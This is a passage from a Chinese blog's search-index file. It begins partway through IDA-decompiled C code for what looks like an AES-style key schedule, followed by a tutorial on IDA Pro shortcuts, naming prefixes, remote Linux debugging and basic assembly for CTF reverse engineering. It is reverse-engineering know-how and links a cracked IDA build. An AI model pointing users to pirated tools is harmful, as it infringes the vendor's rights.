<span class="token operator">=</span> <span class="token operator">&amp;</span>v13<span class="token punctuation">[</span>a1 <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">4</span> <span class="token operator">*</span> v5<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">do</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v15 <span class="token operator">+</span> v46 <span class="token operator">>=</span> v43 <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          v19 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>v18<span class="token operator">++</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token operator">++</span>v15<span class="token punctuation">;</span>          <span class="token operator">*</span><span class="token punctuation">(</span>v18 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">*</span>v44 <span class="token operator">^</span> v19<span class="token punctuation">;</span>          v44 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> v15 <span class="token operator">&lt;</span> <span class="token number">4</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span> v46 <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">&lt;</span> v43 <span class="token punctuation">)</span>          v12<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token operator">&amp;</span>v13<span class="token punctuation">[</span>a1 <span class="token operator">+</span> <span class="token number">28</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">4</span> <span class="token operator">*</span> v5<span class="token punctuation">]</span> <span class="token operator">^</span> <span class="token function">sub_4021D0</span><span class="token punctuation">(</span>v12<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        v20 <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>        v21 <span class="token operator">=</span> v12 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">;</span>        v22 <span class="token operator">=</span> <span class="token operator">&amp;</span>v13<span class="token punctuation">[</span>a1 <span class="token operator">+</span> <span class="token number">32</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">4</span> <span class="token operator">*</span> v5<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">do</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v20 <span class="token operator">+</span> v46 <span class="token operator">>=</span> v43 <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token operator">++</span>v20<span class="token punctuation">;</span>          <span class="token operator">*</span>v21 <span class="token operator">=</span> <span class="token operator">*</span>v22 <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>v21 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          v22 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>          <span class="token operator">++</span>v21<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> v20 <span class="token operator">&lt;</span> v5 <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token operator">></span> <span class="token number">1</span> <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        v16 <span class="token operator">=</span> v12 <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">;</span>        v17 <span class="token operator">=</span> <span class="token operator">&amp;</span>v13<span class="token punctuation">[</span>a1 <span class="token operator">+</span> <span class="token number">16</span> <span class="token operator">+</span> <span class="token operator">-</span><span class="token number">4</span> <span class="token operator">*</span> v5<span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">do</span>        <span class="token punctuation">&#123;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span> v15 <span class="token operator">+</span> v46 <span class="token operator">>=</span> v43 <span class="token punctuation">)</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>          <span class="token operator">++</span>v15<span class="token punctuation">;</span>          <span class="token operator">*</span>v16 <span class="token operator">=</span> <span class="token operator">*</span>v17 <span class="token operator">^</span> <span class="token operator">*</span><span class="token punctuation">(</span>v16 <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>          v17 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>          <span class="token operator">++</span>v16<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span> v15 <span class="token operator">&lt;</span> v5 <span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      v12 <span class="token operator">+=</span> v5<span class="token punctuation">;</span>      v8 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token punctuation">(</span>v5 <span class="token operator">+</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">;</span>      v23 <span class="token operator">=</span> v5 <span class="token operator">+</span> v46 <span class="token operator">&lt;</span> v43<span class="token punctuation">;</span>      v46 <span class="token operator">+=</span> v5<span class="token punctuation">;</span>      <span class="token operator">++</span>v41<span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v23 <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      v11 <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">8</span> <span class="token operator">-</span> a1<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    v7 <span class="token operator">=</span> a1<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  v24 <span class="token operator">=</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">[</span>v8 <span class="token operator">+</span> <span class="token number">59</span><span class="token punctuation">]</span><span class="token punctuation">;</span>  v25 <span class="token operator">=</span> v7 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">;</span>  v26 <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>    v27 <span class="token operator">=</span> <span class="token operator">*</span>v25<span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token operator">*</span>v24<span class="token operator">++</span> <span class="token operator">=</span> v27<span class="token punctuation">;</span>    <span class="token operator">--</span>v26<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v26 <span class="token punctuation">)</span><span class="token punctuation">;</span>  v28 <span class="token operator">=</span> v8 <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">;</span>  v42 <span class="token operator">=</span> v8 <span class="token operator">-</span> <span class="token number">4</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v8 <span class="token operator">-</span> <span class="token number">4</span> <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v29 <span class="token operator">=</span> v7 <span class="token operator">+</span> <span class="token number">7</span><span class="token punctuation">;</span>    v40 <span class="token operator">=</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">[</span>v8 <span class="token operator">+</span> <span class="token number">55</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v47 <span class="token operator">=</span> <span class="token punctuation">(</span>v8 <span class="token operator">-</span> <span class="token number">5</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>      v30 <span class="token operator">=</span> v40<span class="token punctuation">;</span>      v31 <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>      <span class="token keyword">do</span>      <span class="token punctuation">&#123;</span>        <span class="token operator">*</span>v30<span class="token operator">++</span> <span class="token operator">=</span> <span class="token function">sub_402270</span><span class="token punctuation">(</span><span class="token operator">*</span>v29<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token operator">--</span>v31<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">while</span> <span class="token punctuation">(</span> v31 <span class="token punctuation">)</span><span class="token punctuation">;</span>      v32 <span class="token operator">=</span> v47 <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">;</span>      v40 <span class="token operator">-=</span> <span class="token number">16</span><span class="token punctuation">;</span>      <span class="token operator">--</span>v47<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v32 <span class="token punctuation">)</span><span class="token punctuation">;</span>    v8 <span class="token operator">=</span> v43<span class="token punctuation">;</span>    v28 <span class="token operator">=</span> v42<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> v28 <span class="token operator">&lt;</span> v8 <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v33 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> v8<span class="token punctuation">;</span>    v34 <span class="token operator">=</span> <span class="token number">4</span> <span class="token operator">*</span> v28<span class="token punctuation">;</span>    v35 <span class="token operator">=</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">[</span>v28 <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    v36 <span class="token operator">=</span> v8 <span class="token operator">-</span> v28<span class="token punctuation">;</span>    <span class="token keyword">do</span>    <span class="token punctuation">&#123;</span>      v37 <span class="token operator">=</span> <span class="token operator">*</span>v35<span class="token punctuation">;</span>      v38 <span class="token operator">=</span> v34 <span class="token operator">-</span> v33<span class="token punctuation">;</span>      v34 <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">;</span>      <span class="token operator">++</span>v35<span class="token punctuation">;</span>      <span class="token operator">--</span>v36<span class="token punctuation">;</span>      <span class="token operator">*</span><span class="token punctuation">(</span>v7 <span class="token operator">+</span> v38 <span class="token operator">+</span> <span class="token number">268</span><span class="token punctuation">)</span> <span class="token operator">=</span> v37<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> v36 <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Crypto </tag>
            
            <tag> Reverse </tag>
            
            <tag> IDA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IDA的基础和使用</title>
      <link href="/posts/b9f1f74e.html"/>
      <url>/posts/b9f1f74e.html</url>
      
        <content type="html"><![CDATA[<h1 id="IDA-的下载安装"><a href="#IDA-的下载安装" class="headerlink" title="IDA 的下载安装"></a>IDA 的下载安装</h1><blockquote><p>建议使用 <a href="https://www.52pojie.cn/">吾爱破解论坛</a> 提供的 IDA Pro版本（<strong>有能力请务必<a href="https://hex-rays.com/IDA-pro/">支持正版</a>，这里仅供讨论学习使用</strong>）</p></blockquote><ul><li><p>下载：<a href="https://www.52pojie.cn/thread-1584115-1-1.html">IDA Pro 7.7.220118 (SP1) 全插件绿色版</a></p></li><li><p>另外，IDA Pro 7.7 需要 <code>python3</code> 环境，否则在 IDA Pro 7.7 的 <code>output</code> 处会显示如下报错：</p></li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">WARNING: Python <span class="token number">3</span> is not configured <span class="token punctuation">(</span>Python3TargetDLL value is not <span class="token builtin class-name">set</span><span class="token punctuation">)</span>.Please run idapyswitch to <span class="token keyword">select</span> a Python <span class="token number">3</span> install.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li>确保安装了 <code>python3</code> 环境后，打开 IDA 的安装路径，在根目录下有一个 <code>idapyswitch.exe</code><br>双击运行后，会有一个弹窗，让你选择 python 的版本，一般默认是 0<br>如果安装了多个 python，可以根据自己的需要选择具体的 python 版本</li></ul><hr><h1 id="IDA-的常用快捷键"><a href="#IDA-的常用快捷键" class="headerlink" title="IDA 的常用快捷键"></a>IDA 的常用快捷键</h1><table><thead><tr><th>作用</th><th>快捷键</th></tr></thead><tbody><tr><td><strong>查看字符串</strong></td><td>Shift + F12</td></tr><tr><td><strong>反汇编</strong></td><td>F5</td></tr><tr><td><strong>快速查看16进制数的ASCii码对应的字符</strong></td><td>r</td></tr><tr><td><strong>在反汇编后的界面中写下注释</strong></td><td>；</td></tr><tr><td><strong>在反编译后伪代码的界面中写下注释</strong></td><td>&#x2F;</td></tr><tr><td><strong>查看、隐藏变量的类型</strong></td><td>\</td></tr><tr><td><strong>对着某个函数、变量按该快捷键，查看它的交叉引用</strong></td><td>x</td></tr><tr><td><strong>直接跳转到某个地址</strong></td><td>g</td></tr><tr><td><strong>更改变量的名称</strong></td><td>n</td></tr><tr><td><strong>拍摄IDA快照</strong></td><td>ctrl + shift + w</td></tr><tr><td><strong>嵌入脚本</strong></td><td>shift + F2</td></tr><tr><td><strong>文本搜索字符串</strong></td><td>alt + t</td></tr><tr><td><strong>将数据转换为16 进制</strong></td><td>h</td></tr><tr><td><strong>获取数组的数据</strong></td><td>shift + e</td></tr><tr><td><strong>对数据db&#x2F;dw&#x2F;dd之间进行切换</strong></td><td>d</td></tr><tr><td><strong>转化为函数</strong></td><td>p</td></tr><tr><td><strong>将数据转化为代码</strong></td><td>c</td></tr><tr><td><strong>将数据转化为字符串</strong></td><td>a</td></tr><tr><td><strong>将代码转换为数据</strong></td><td>u</td></tr></tbody></table><hr><h1 id="IDA-命名前缀的含义"><a href="#IDA-命名前缀的含义" class="headerlink" title="IDA 命名前缀的含义"></a>IDA 命名前缀的含义</h1><blockquote><p>IDA 会自动生成假名字，用于表示子函数、程序地址和数据，根据不同的类型和值，假名字有不同的前缀</p></blockquote><hr><table><thead><tr><th>前缀</th><th>意义</th></tr></thead><tbody><tr><td><strong>sub_</strong></td><td>指令和子函数起点</td></tr><tr><td>locret_</td><td>返回指令</td></tr><tr><td><strong>loc_</strong></td><td>指令</td></tr><tr><td><strong>off_</strong></td><td>数据，包含偏移量</td></tr><tr><td><strong>seg_</strong></td><td>数据，包含段地址值</td></tr><tr><td>asc_</td><td>数据，ASCII字符串</td></tr><tr><td><strong>byte_</strong></td><td>数据，字节（或字节数组）</td></tr><tr><td><strong>word_</strong></td><td>数据，16位数据（或字数组）</td></tr><tr><td><strong>dword_</strong></td><td>数据，32位数据（或双字数组）</td></tr><tr><td><strong>qword_</strong></td><td>数据，64位数据（或4字数组）</td></tr><tr><td>flt_</td><td>浮点数据，32位（或浮点数组）</td></tr><tr><td>dbl_</td><td>浮点数，64位（或双精度数组）</td></tr><tr><td>tbyte_</td><td>浮点数，80位（或扩展精度浮点数）</td></tr><tr><td>stru_</td><td>结构体(或结构体数组)</td></tr><tr><td>algn_</td><td>对齐指示</td></tr><tr><td><strong>unk_</strong></td><td>未处理字节</td></tr></tbody></table><hr><h1 id="IDA-远程调试"><a href="#IDA-远程调试" class="headerlink" title="IDA 远程调试"></a>IDA 远程调试</h1><blockquote><p>有时候程序是 Linux 平台的 elf 文件，可以使用 Windows 端的 IDA 对 Linux 端的程序远程调试</p></blockquote><ol><li>首先到 Windows 端 IDA 路径的 <code>dbgsrv</code> 目录下：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%951.png" alt="IDA远程调试1.png"><br>找到 <code>linux_server</code> 和 <code>linux_server64</code> 两个文件  </p><p><code>linux_server</code> 是连接 32 位程序的，<code>linux_server64</code> 连接 64 位程序  </p><p>将这两个文件拷到 Linux 虚拟机中</p><ol start="2"><li>给这两个文件增加执行权限，然后运行（需要调试多少位的程序就运行哪一个）</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%952.png" alt="IDA远程调试2.png"><br>记住端口号：23946  </p><p><strong>保持运行，不要关</strong></p><ol start="3"><li>先在 Windows 端 IDA 中 <code>快捷键 F2</code> 下好断点</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%953.png" alt="IDA远程调试3.png"><br>然后选择调试器  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%954.png" alt="IDA远程调试4.png"><br>然后按 <code>快捷键 F9</code> 运行程序  </p><p>会弹出一个输入框：  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%955.png" alt="IDA远程调试5.png"><br>这里的 <code>Hostname</code> 是你的 Linux 虚拟机的 ip 地址  </p><p>可以在 Linux 虚拟机终端输入 <code>ifconfig</code> 获取 ip 地址，我这里是 192.168.171.128  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%956.png" alt="IDA远程调试6.png">  </p><p>将其他参数填完整：  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%957.png" alt="IDA远程调试7.png">  </p><p><strong>注意：这里所有的参数都是填 Linux 的</strong>  </p><p><code>Application</code> 和 <code>Input file</code> 填：调试程序在 Linux 的绝对路径<br><code>Directory</code> 填：调试程序所在目录的绝对路径</p><ol start="4"><li>如果弹出 <code>&quot;Input file is missing: xxx&quot;</code> 的报错</li></ol><p>IDA 会询问是否向 Linux 端拷贝这个调试程序  </p><p>点 <code>&quot;OK&quot;</code> 就行，然后选择 Windows 本地的调试程序，IDA 会自动拷贝过去（一般是路径输错了，但是 IDA 拷贝过去也可以调试）</p><ol start="5"><li>成功连接的界面如下：</li></ol><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%958.png" alt="IDA远程调试8.png">  </p><p>同时，可以看到 Linux 端执行的程序：  </p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/IDA%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%959.png" alt="IDA远程调试9.png"></p><hr><h1 id="IDA-中的汇编基础"><a href="#IDA-中的汇编基础" class="headerlink" title="IDA 中的汇编基础"></a>IDA 中的汇编基础</h1><h2 id="字符串末尾用-‘0’-表示结束"><a href="#字符串末尾用-‘0’-表示结束" class="headerlink" title="字符串末尾用 ‘0’ 表示结束"></a>字符串末尾用 ‘0’ 表示结束</h2><ul><li><strong>Format 的内容：”Welcome The System\nPlease Input Key:”</strong></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402100</span> <span class="token number">57</span> <span class="token number">65</span> <span class="token number">6</span>C <span class="token number">63</span> <span class="token number">6F</span> <span class="token number">6</span>D <span class="token number">65</span> <span class="token number">20</span> <span class="token number">54</span> <span class="token number">68</span><span class="token operator">+</span> Format db <span class="token char">'Welcome The System'</span> <span class="token punctuation">,</span> <span class="token number">0</span>Ah <span class="token punctuation">;</span>     DATA XREF<span class="token operator">:</span> _main<span class="token operator">+</span><span class="token number">28</span>↑o<span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402100</span> <span class="token number">65</span> <span class="token number">20</span> <span class="token number">53</span> <span class="token number">79</span> <span class="token number">73</span> <span class="token number">74</span> <span class="token number">65</span> <span class="token number">6</span>D <span class="token number">0</span>A <span class="token number">50</span><span class="token operator">+</span> db <span class="token char">'Please Input Key:'</span> <span class="token punctuation">,</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><strong>byte_402150 的内容：<code>2a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6</code><br>byte_402151 的内容：<code>a49f69c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6</code></strong></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402150</span> <span class="token punctuation">;</span> <span class="token keyword">char</span> byte_402150<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402150</span> <span class="token number">32</span> byte_402150 db <span class="token char">'2'</span> <span class="token punctuation">;</span>      DATA XREF<span class="token operator">:</span> sub_401090<span class="token operator">:</span>loc_4010CC↑r<span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402151</span> <span class="token punctuation">;</span> <span class="token keyword">char</span> byte_402151<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402151</span> <span class="token number">61</span> byte_402151 db <span class="token char">'a'</span> <span class="token punctuation">;</span>      DATA XREF<span class="token operator">:</span> sub_401090<span class="token operator">:</span>loc_4010E9↑r<span class="token punctuation">.</span>rdata<span class="token operator">:</span><span class="token number">00402152</span> <span class="token number">34</span> <span class="token number">39</span> <span class="token number">66</span> <span class="token number">36</span> <span class="token number">39</span> <span class="token number">63</span> <span class="token number">33</span> <span class="token number">38</span> <span class="token number">33</span> <span class="token number">39</span><span class="token operator">+</span>a49f69c38395cde db '<span class="token number">49f</span><span class="token number">69</span>c38395cde96d6de96d6f4e025484954d6195448def6e2dad67786e21d5adae6' <span class="token punctuation">,</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="用-dup-开辟未初始化的空间"><a href="#用-dup-开辟未初始化的空间" class="headerlink" title="用 dup(?) 开辟未初始化的空间"></a>用 <code>dup(?)</code> 开辟未初始化的空间</h2><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/CTF%20-%20Reverse_IDA%E2%80%94%E2%80%94%E6%B1%87%E7%BC%96%E7%9F%A5%E8%AF%861.png" alt="CTF - Reverse_IDA——汇编知识1.png"></p><ul><li><strong><code>str2 db 68h dup(?)</code> 是指开辟一个 68h 长度的空间，且不进行初始化</strong></li></ul>]]></content>
      
      
      <categories>
          
          <category> 逆向工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Reverse </tag>
            
            <tag> IDA </tag>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
